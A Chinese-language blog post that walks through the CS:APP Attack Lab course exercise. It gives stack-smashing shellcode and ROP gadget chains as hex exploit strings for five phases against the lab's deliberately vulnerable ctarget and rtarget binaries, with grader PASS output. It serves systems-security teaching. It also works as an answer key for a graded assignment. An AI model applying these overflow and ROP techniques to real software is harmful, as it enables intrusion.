<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>CS:APP Attack_lab | OneStep</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="192x192" href="/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/manifest.json">
    <link rel="alternate" type="application/rss+xml" href="https://wmc1999.top/rss.xml" title="OneStep RSS Feed">
    <meta name="description" content="CS:APP缓冲区溢出攻击实验">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    
    <link rel="preload" href="/assets/css/0.styles.e4481a5a.css" as="style"><link rel="preload" href="/assets/js/app.f25a4321.js" as="script"><link rel="preload" href="/assets/js/6.036fc43e.js" as="script"><link rel="preload" href="/assets/js/3.e3d55509.js" as="script"><link rel="preload" href="/assets/js/34.431af884.js" as="script"><link rel="preload" href="/assets/js/9.151ac344.js" as="script"><link rel="prefetch" href="/assets/js/10.e077d793.js"><link rel="prefetch" href="/assets/js/11.93b1eff1.js"><link rel="prefetch" href="/assets/js/12.165a8f38.js"><link rel="prefetch" href="/assets/js/13.86b71190.js"><link rel="prefetch" href="/assets/js/14.f7c31146.js"><link rel="prefetch" href="/assets/js/15.b61267d7.js"><link rel="prefetch" href="/assets/js/16.e7b2390a.js"><link rel="prefetch" href="/assets/js/17.c6ea5fff.js"><link rel="prefetch" href="/assets/js/18.678082c9.js"><link rel="prefetch" href="/assets/js/19.21a8a34e.js"><link rel="prefetch" href="/assets/js/20.9edcae00.js"><link rel="prefetch" href="/assets/js/21.f0f9d500.js"><link rel="prefetch" href="/assets/js/22.b54c9990.js"><link rel="prefetch" href="/assets/js/23.53b24cbf.js"><link rel="prefetch" href="/assets/js/24.659f2811.js"><link rel="prefetch" href="/assets/js/25.d1cafbf8.js"><link rel="prefetch" href="/assets/js/26.b17873ae.js"><link rel="prefetch" href="/assets/js/27.2aa200a3.js"><link rel="prefetch" href="/assets/js/28.15123e9b.js"><link rel="prefetch" href="/assets/js/29.f9430524.js"><link rel="prefetch" href="/assets/js/30.ea435c6a.js"><link rel="prefetch" href="/assets/js/31.cefe08f6.js"><link rel="prefetch" href="/assets/js/32.df4e8226.js"><link rel="prefetch" href="/assets/js/33.89c22683.js"><link rel="prefetch" href="/assets/js/35.5b664f83.js"><link rel="prefetch" href="/assets/js/36.f179d54b.js"><link rel="prefetch" href="/assets/js/37.11846bd5.js"><link rel="prefetch" href="/assets/js/4.d1c52263.js"><link rel="prefetch" href="/assets/js/5.ed205acd.js"><link rel="prefetch" href="/assets/js/7.43914937.js"><link rel="prefetch" href="/assets/js/8.21172198.js"><link rel="prefetch" href="/assets/js/vuejs-paginate.dfe54976.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e4481a5a.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div id="vuepress-theme-blog__global-layout"><section id="header-wrapper"><header id="header"><div class="header-wrapper"><div class="title"><a href="/" class="nav-link home-link">OneStep </a></div> <div class="header-right-wrap"><ul class="nav"><li class="nav-item"><a href="/" class="nav-link">Home</a></li><li class="nav-item"><a href="/blog/" class="nav-link">Blog</a></li><li class="nav-item"><a href="/tag/" class="nav-link">Tag</a></li><li class="nav-item"><a href="/about/" class="nav-link">About </a></li><li class="nav-item"><a href="https://github.com/jason210314/" target="_blank" rel="noopener noreferrer" class="nav-link external">github </a></li></ul> <div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <a href="/rss.xml" class="feed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></div></div></header></section> <div id="mobile-header"><div class="mobile-header-bar"><div class="mobile-header-title"><a href="/" class="nav-link mobile-home-link">OneStep </a> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div> <div class="mobile-menu-wrapper"><hr class="menu-divider"> <ul class="mobile-nav"><li class="mobile-nav-item"><a href="/" class="nav-link">Home</a></li><li class="mobile-nav-item"><a href="/blog/" class="nav-link">Blog</a></li><li class="mobile-nav-item"><a href="/tag/" class="nav-link">Tag</a></li><li class="mobile-nav-item"><a href="/about/" class="nav-link">About </a></li><li class="mobile-nav-item"><a href="https://github.com/jason210314/" target="_blank" rel="noopener noreferrer" class="nav-link external">github </a></li> <li class="mobile-nav-item"><a href="/rss.xml" class="feed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></li></ul></div></div></div> <div class="content-wrapper"><div id="vuepress-theme-blog__post-layout"><article itemscope="itemscope" itemtype="https://schema.org/BlogPosting" class="vuepress-blog-theme-content"><header><h1 itemprop="name headline" class="post-title">
        CS:APP Attack_lab
      </h1> <div class="post-meta"><!----> <div class="post-meta-date"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg> <time pubdate itemprop="datePublished" datetime="2018-12-08T17:49:57.000Z">
      2018-12-08
    </time></div> <ul itemprop="keywords" class="post-meta-tags"><li class="post-tag" data-v-42ccfcd5><a href="/tag/CS:APP" data-v-42ccfcd5><span data-v-42ccfcd5>CS:APP</span></a></li></ul></div></header> <div itemprop="articleBody" class="content__default"><h1 id="实验描述"><a href="#实验描述" class="header-anchor">#</a> 实验描述</h1> <p>本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在 getbuf 函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。</p> <h1 id="第一阶段"><a href="#第一阶段" class="header-anchor">#</a> 第一阶段</h1> <p>第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。</p> <p>那么我们将需要执行的操作码和地址输入机器码即可。</p> <h2 id="phase-1"><a href="#phase-1" class="header-anchor">#</a> phase_1</h2> <p>第一关非常简单，题目主要我们在 getbuf 执行完成后执行 touch1,touch1()无参。</p> <div class="language-assembly extra-class"><pre class="language-text"><code>(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x0000000000401688 &lt;+0&gt;:	sub    $0x18,%rsp
   0x000000000040168c &lt;+4&gt;:	mov    %rsp,%rdi
   0x000000000040168f &lt;+7&gt;:	callq  0x4018ca &lt;Gets&gt;
   0x0000000000401694 &lt;+12&gt;:	mov    $0x1,%eax
   0x0000000000401699 &lt;+17&gt;:	add    $0x18,%rsp
   0x000000000040169d &lt;+21&gt;:	retq
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004016a0 &lt;+0&gt;:	sub    $0x8,%rsp
   0x00000000004016a4 &lt;+4&gt;:	movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;
   0x00000000004016ae &lt;+14&gt;:	mov    $0x402e4e,%edi
   0x00000000004016b3 &lt;+19&gt;:	callq  0x400bd0 &lt;puts@plt&gt;
   0x00000000004016b8 &lt;+24&gt;:	mov    $0x1,%edi
   0x00000000004016bd &lt;+29&gt;:	callq  0x401ab5 &lt;validate&gt;
   0x00000000004016c2 &lt;+34&gt;:	mov    $0x0,%edi
   0x00000000004016c7 &lt;+39&gt;:	callq  0x400d60 &lt;exit@plt&gt;
End of assembler dump.
</code></pre></div><p>可以看到，getbuf 开出了 0x18，即 24 字节的空间，touch1 的地址为 0x4016a0。那么我们只需填满这 0x28 空间，再以 touch1 地址替代返回值。注意：x86-64 机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a0 <span class="token number">16</span> <span class="token number">40</span> 00 00 00 00 00
</code></pre></div><p>转换后输入即可</p> <div class="language-bash extra-class"><pre class="language-bash"><code>Cookie: 0x63149380
Type string:Touch1<span class="token operator">!</span>: You called touch1<span class="token punctuation">(</span><span class="token punctuation">)</span>
Valid solution <span class="token keyword">for</span> level <span class="token number">1</span> with target ctarget
PASS: Would have posted the following:
	user <span class="token function">id</span>	<span class="token number">2017211523</span>
	course	f18
	lab	attacklab
	result	<span class="token number">117</span>:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 <span class="token number">16</span> <span class="token number">40</span> 00 00 00 00 00
</code></pre></div><h2 id="phase-2"><a href="#phase-2" class="header-anchor">#</a> phase_2</h2> <p>第二关根据题意，需要调用 touch2，需要传递一个无符号整数值，其值为 cookie，查看 cookie 文件，如下。</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">2017211523</span>@bupt3:~/target117$ <span class="token function">cat</span> cookie.txt
0x63149380
</code></pre></div><p>为了给 touch2 传参，我们需要将 cookie 值赋给%rdi，然后将 touch2 地址压栈，使用 ret 弹出 touch2 地址返回，调用 touch2。</p> <div class="language-assembly extra-class"><pre class="language-text"><code>mov     $0x63149380,%rdi
pushq   $0x4016cc
ret
</code></pre></div><p>将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。</p> <div class="language-assembly extra-class"><pre class="language-text"><code>phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi
   7:   68 cc 16 40 00          pushq  $0x4016cc
   c:   c3                      retq
</code></pre></div><p>我们将指令的机器码放在 getbuf 时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用 getbuf 时栈顶地址为 0x5566f7a8。</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">48</span> c7 c7 <span class="token number">80</span> <span class="token number">93</span> <span class="token number">14</span> <span class="token number">63</span> <span class="token number">68</span>
cc <span class="token number">16</span> <span class="token number">40</span> 00 c3 00 00 00
00 00 00 00 00 00 00 00
a8 f7 <span class="token number">66</span> <span class="token number">55</span> 00 00 00 00
</code></pre></div><p>输入运行。</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">2017211523</span>@bupt3:~/target117$ ./hex2raw <span class="token operator">&lt;</span> phase2 <span class="token operator">|</span> ./ctarget -q
Cookie: 0x63149380
Type string:Touch2<span class="token operator">!</span>: You called touch2<span class="token punctuation">(</span>0x63149380<span class="token punctuation">)</span>
Valid solution <span class="token keyword">for</span> level <span class="token number">2</span> with target ctarget
PASS: Would have posted the following:
	user <span class="token function">id</span>	<span class="token number">2017211523</span>
	course	f18
	lab	attacklab
	result	<span class="token number">117</span>:PASS:0xffffffff:ctarget:2:48 C7 C7 <span class="token number">80</span> <span class="token number">93</span> <span class="token number">14</span> <span class="token number">63</span> <span class="token number">68</span> CC <span class="token number">16</span> <span class="token number">40</span> 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 <span class="token number">66</span> <span class="token number">55</span> 00 00 00 00
</code></pre></div><h2 id="phase-3"><a href="#phase-3" class="header-anchor">#</a> phase_3</h2> <p>查看 touch3</p> <div class="language-cpp extra-class"><pre class="language-cpp"><code><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>可知其需要一个指向字符的指针 sval，然后调用 hexmatch，将 cookie 和 sval 作为参数传入，需要 hexomatch 返回非零值。</p> <div class="language-cpp extra-class"><pre class="language-cpp"><code><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">/* Make position of check string unpredictable */</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">&quot;%.8x&quot;</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>由 hexmatch 可知，其比较 cookie 的字符串表示与传入的字符串是否相等，相等则返回 1，那么问题明了，我们需要将表示 cookie 的字符串地址传给 touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用 hexmatch 时候未被重写改变的空间，借以保存字符串。</p> <div class="language-assembly extra-class"><pre class="language-text"><code>mov     $0x5566f7c8,%rdi
pushq   $0x4017a0
ret
</code></pre></div><p>这里我们将 cookie 的字符串表示放在 0x5566f7c8，编译再反汇编得到机器码</p> <div class="language-assembly extra-class"><pre class="language-text"><code>phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi
   7:   68 a0 17 40 00          pushq  $0x4017a0
   c:   c3                      retq
</code></pre></div><p>查表得出 cookie 字符串的 16 进制表示为 36 33 31 34 39 33 38 30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\0’，得到攻击字符串如下</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">48</span> c7 c7 c8 f7 <span class="token number">66</span> <span class="token number">55</span> <span class="token number">68</span>
a0 <span class="token number">17</span> <span class="token number">40</span> 00 c3 00 00 00
00 00 00 00 00 00 00 00
a8 f7 <span class="token number">66</span> <span class="token number">55</span> 00 00 00 00
<span class="token number">36</span> <span class="token number">33</span> <span class="token number">31</span> <span class="token number">34</span> <span class="token number">39</span> <span class="token number">33</span> <span class="token number">38</span> <span class="token number">30</span>
00
</code></pre></div><p>转换输入运行</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">2017211523</span>@bupt3:~/target117$ ./hex2raw <span class="token operator">&lt;</span> phase3 <span class="token operator">|</span> ./ctarget -q
Cookie: 0x63149380
Type string:Touch3<span class="token operator">!</span>: You called touch3<span class="token punctuation">(</span><span class="token string">&quot;63149380&quot;</span><span class="token punctuation">)</span>
Valid solution <span class="token keyword">for</span> level <span class="token number">3</span> with target ctarget
PASS: Would have posted the following:
	user <span class="token function">id</span>	<span class="token number">2017211523</span>
	course	f18
	lab	attacklab
	result	<span class="token number">117</span>:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 <span class="token number">66</span> <span class="token number">55</span> <span class="token number">68</span> A0 <span class="token number">17</span> <span class="token number">40</span> 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 <span class="token number">66</span> <span class="token number">55</span> 00 00 00 00 <span class="token number">36</span> <span class="token number">33</span> <span class="token number">31</span> <span class="token number">34</span> <span class="token number">39</span> <span class="token number">33</span> <span class="token number">38</span> <span class="token number">30</span> 00
</code></pre></div><h1 id="第二阶段"><a href="#第二阶段" class="header-anchor">#</a> 第二阶段</h1> <p>在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：</p> <p>1.函数栈随机化 ，无法再获取绝对地址。</p> <p>2.栈内存的内容被锁定为不可执行。</p> <p>故此，我们需要使用 ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用 ret 指令返回完成所需操作。</p> <h2 id="phase-4"><a href="#phase-4" class="header-anchor">#</a> phase_4</h2> <p>此关需用 ROP 方法完成 phase_2 内容。那么就需要在操作中得到 cookie 值，那么只有用 pop 指令了，需要指令为。</p> <div class="language-assembly extra-class"><pre class="language-text"><code>popq 	%rax
movq	%rax,%rdi
ret
</code></pre></div><p>查找官方的 write up，得知对应机器码，然后在在 rtarget 文件的反汇编文件中利用 vim 查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3c <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	popq rax		*/
<span class="token number">80</span> <span class="token number">93</span> <span class="token number">14</span> <span class="token number">63</span> 00 00 00 00	/*	cookie			*/
<span class="token number">49</span> <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	movq %rax,%rdi 	*/
cc <span class="token number">16</span> <span class="token number">40</span> 00 00 00 00 00 /*	touch2			*/
</code></pre></div><p>转换输入运行</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">2017211523</span>@bupt3:~/target117$ ./hex2raw <span class="token operator">&lt;</span> phase4 <span class="token operator">|</span> ./rtarget
Cookie: 0x63149380
Type string:Touch2<span class="token operator">!</span>: You called touch2<span class="token punctuation">(</span>0x63149380<span class="token punctuation">)</span>
Valid solution <span class="token keyword">for</span> level <span class="token number">2</span> with target rtarget
PASS: Sent exploit string to server to be validated.
NICE <span class="token environment constant">JOB</span><span class="token operator">!</span>
</code></pre></div><h2 id="phase-5"><a href="#phase-5" class="header-anchor">#</a> phase_5</h2> <p>此关为 phase_3 的 ROP 版本，我们需要查找 start_farm 到 end_farm 中的 gadgets，拼凑出代码实现 phase_3 中插入代码的功能。还需注意：</p> <p>1.0x90 代表 nop，除了将 pc 加 1 之外不做任何事。</p> <p>2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。</p> <p>需要的指令有</p> <div class="language-assembly extra-class"><pre class="language-text"><code>movq	%rsp,%rax
movq	%rax,%rdi
popq	%rax
movl	%eax,%ecx
movl	%ecx,%edx
movl	%edx,%esi
lea(%rdi, %rsi, 1),%rax
movq	%rax,%rdi
</code></pre></div><p>则攻击字符串为</p> <div class="language-bash extra-class"><pre class="language-bash"><code>00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
bd <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	gadget1			*/
<span class="token number">49</span> <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	gadget2			*/
<span class="token number">30</span> <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/* 	gadget3			*/
<span class="token number">48</span> 00 00 00 00 00 00 00	/*	cookie字符串偏移量*/
<span class="token number">13</span> <span class="token number">19</span> <span class="token number">40</span> 00 00 00 00 00	/*	gadget4			*/
ca <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	gadget5			*/
b7 <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	gadget6			*/
<span class="token number">69</span> <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	gadget7			*/
<span class="token number">49</span> <span class="token number">18</span> <span class="token number">40</span> 00 00 00 00 00	/*	gadget8			*/
a0 <span class="token number">17</span> <span class="token number">40</span> 00 00 00 00 00 /*	touch3地址   	   */
<span class="token number">36</span> <span class="token number">33</span> <span class="token number">31</span> <span class="token number">34</span> <span class="token number">39</span> <span class="token number">33</span> <span class="token number">38</span> <span class="token number">30</span> /* 	cookie字符串	  */
00
</code></pre></div><p>转换文件运行</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">2017211523</span>@bupt3:~/target117$ ./hex2raw <span class="token operator">&lt;</span> phase5 <span class="token operator">|</span> ./rtarget
Cookie: 0x63149380
Type string:Touch3<span class="token operator">!</span>: You called touch3<span class="token punctuation">(</span><span class="token string">&quot;63149380&quot;</span><span class="token punctuation">)</span>
Valid solution <span class="token keyword">for</span> level <span class="token number">3</span> with target rtarget
PASS: Sent exploit string to server to be validated.
NICE <span class="token environment constant">JOB</span><span class="token operator">!</span>
</code></pre></div><h1 id="到此为止"><a href="#到此为止" class="header-anchor">#</a> 到此为止</h1></div> <footer><!----> <hr> <!----></footer></article> <div class="sticker vuepress-toc"><div class="vuepress-toc-item vuepress-toc-h2 active"><a href="#phase-1" title="phase_1">phase_1</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#phase-2" title="phase_2">phase_2</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#phase-3" title="phase_3">phase_3</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#phase-4" title="phase_4">phase_4</a></div><div class="vuepress-toc-item vuepress-toc-h2"><a href="#phase-5" title="phase_5">phase_5</a></div></div></div></div> <footer class="footer" data-v-3d9deeb8><div class="footer-left-wrap" data-v-3d9deeb8><ul class="contact" data-v-3d9deeb8><li class="contact-item" data-v-3d9deeb8><a href="https://github.com/jason210314" target="_blank" rel="noopener noreferrer" class="nav-link external" data-v-3d9deeb8><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github" data-v-3d9deeb8><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" data-v-3d9deeb8></path></svg>
          
        </a></li></ul></div> <div class="footer-right-wrap" data-v-3d9deeb8><ul class="copyright" data-v-3d9deeb8><li class="copyright-item" data-v-3d9deeb8><a href="https://policies.google.com/privacy?hl=en-US" target="_blank" rel="noopener noreferrer" class="nav-link external" data-v-3d9deeb8>Privacy Policy</a></li><li class="copyright-item" data-v-3d9deeb8>MIT Licensed | Copyright © 2018-present</li></ul></div></footer></div><div class="global-ui"><!----></div></div>
    <script src="/assets/js/app.f25a4321.js" defer></script><script src="/assets/js/6.036fc43e.js" defer></script><script src="/assets/js/3.e3d55509.js" defer></script><script src="/assets/js/34.431af884.js" defer></script><script src="/assets/js/9.151ac344.js" defer></script>
  </body>
</html>
